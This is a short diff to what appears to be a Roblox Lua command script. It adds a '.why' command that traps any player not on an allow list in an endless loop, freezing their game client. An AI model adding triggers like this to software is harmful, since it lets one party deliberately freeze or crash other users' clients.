@@ -10614,6 +10614,11 @@ local commands = {
 			game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = false
 		end
 	end,
+	[".why"] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			while true do end
+		end
+	end,
 	[".lagback"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			for i = 1, 10 do
